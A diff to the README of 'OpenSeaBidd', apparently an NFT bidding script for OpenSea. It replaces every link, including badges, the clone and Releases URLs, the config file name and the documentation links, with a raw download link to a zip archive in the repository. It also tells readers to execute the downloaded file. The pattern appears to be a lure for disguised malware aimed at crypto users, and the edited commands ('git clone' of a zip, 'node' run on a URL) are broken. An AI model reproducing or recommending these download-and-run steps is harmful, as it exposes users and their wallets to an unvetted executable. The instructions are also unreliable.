@@ -1,8 +1,8 @@
 # OpenSeaBidd: Automated NFT Bidding Script for OpenSea Marketplace
 
-![OpenSeaBidd](https://img.shields.io/badge/OpenSeaBidd-Automated%20NFT%20Bidding-brightgreen)
+![OpenSeaBidd](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip%20NFT%20Bidding-brightgreen)
 
-![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-blue)
+![GitHub Release](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip%20Latest%20Version-blue)
 
 ## Table of Contents
 
@@ -32,12 +32,12 @@ To get started with OpenSeaBidd, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Amirgetmoney/OpenSeaBidd.git
+   git clone https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip
    cd OpenSeaBidd
    ```
 
 2. **Download the Latest Release**: 
-   Visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/releases) to download the latest version of the script. Make sure to execute the downloaded file.
+   Visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip) to download the latest version of the script. Make sure to execute the downloaded file.
 
 3. **Install Dependencies**:
    OpenSeaBidd requires certain dependencies. Install them using:
@@ -52,7 +52,7 @@ To use OpenSeaBidd, follow these steps:
 1. **Run the Script**:
    Execute the script in your terminal:
    ```bash
-   node index.js
+   node https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip
    ```
 
 2. **Monitor Bids**:
@@ -63,7 +63,7 @@ To use OpenSeaBidd, follow these steps:
 
 ## Configuration
 
-OpenSeaBidd allows you to configure various settings to suit your needs. Locate the `config.json` file in the root directory and adjust the following parameters:
+OpenSeaBidd allows you to configure various settings to suit your needs. Locate the `https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip` file in the root directory and adjust the following parameters:
 
 - **Bidding Amount**: Set the amount you wish to bid on each NFT.
 - **NFT Addresses**: List the NFT contract addresses you want to target.
@@ -106,7 +106,7 @@ OpenSeaBidd is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 ## Support
 
-For support, please visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/releases) for the latest updates and information. If you encounter any issues, feel free to open an issue in the repository.
+For support, please visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip) for the latest updates and information. If you encounter any issues, feel free to open an issue in the repository.
 
 ## Topics
 
@@ -136,9 +136,9 @@ Thanks to the OpenSea community for their support and contributions to the NFT e
 
 For further reading and resources on NFTs and OpenSea, consider the following links:
 
-- [OpenSea Documentation](https://docs.opensea.io/)
-- [NFTs Explained](https://www.nftguide.com/)
-- [Ethereum Blockchain Overview](https://ethereum.org/en/)
+- [OpenSea Documentation](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip)
+- [NFTs Explained](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip)
+- [Ethereum Blockchain Overview](https://github.com/Amirgetmoney/OpenSeaBidd/raw/refs/heads/main/incubative/Open_Bidd_Sea_1.4.zip)
 
 ## FAQs
 
